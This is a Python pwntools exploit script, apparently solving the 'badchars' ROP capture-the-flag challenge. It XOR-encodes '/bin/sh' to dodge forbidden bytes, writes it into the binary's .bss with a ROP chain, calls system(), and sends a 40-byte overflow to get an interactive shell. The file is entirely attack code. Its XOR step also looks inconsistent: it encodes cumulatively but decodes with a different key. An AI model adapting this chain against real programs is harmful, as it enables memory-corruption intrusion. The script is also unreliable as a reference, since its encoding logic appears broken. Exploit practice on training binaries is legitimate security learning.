import pwn
import sys

BAD_CHARS = "bic/ fns"

# Setup enviroment
process = pwn.process("./badchars")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("badchars")
rop = pwn.ROP(elf)

# Get cmd, encode and pad
cmd = "/bin/sh" if len(sys.argv) == 1 else sys.argv[1]
_xor = 0

while any(char in cmd for char in BAD_CHARS):
    _xor += 1
    cmd = ''.join(chr(ord(s) ^ _xor) for s in cmd)
    if _xor == 256:
        pwn.log.info("No possible command found\n Exiting smoothly")
        sys.exit(0)

pwn.log.success("Encoding found with,\n xor int = {0} and cmd = {1}".format(_xor + 1, cmd))
padded_cmd = cmd + 8 * "\x00" if len(cmd) % 8 == 0 else cmd + (8-(len(cmd)%8)) * "\x00"

# Write to location
for i in range(0, len(padded_cmd), 8):
    rop.raw(rop.find_gadget(["pop r12", "pop r13", "ret"]))
    rop.raw(padded_cmd[i:i+8])
    rop.raw(elf.bss()+i)
    rop.raw(elf.symbols["usefulGadgets"]+4) # mov r13, r12

# Decode if command was _xor'd
if _xor !=  0:
    for i in range(len(cmd)):
        rop.raw(elf.symbols["usefulGadgets"]+16)
        rop.raw(chr(_xor+1) * 8)
        rop.raw(elf.bss()+i)
        rop.raw(elf.symbols["usefulGadgets"]) # xor r15, r14; ret;

rop.system(elf.bss())
pwn.log.info(rop.dump())

# Execute cmd
payload = "A" * 40 + rop.chain()
process.readline()
process.readline()
process.readline()
process.readline()
process.sendline(payload)
process.interactive()
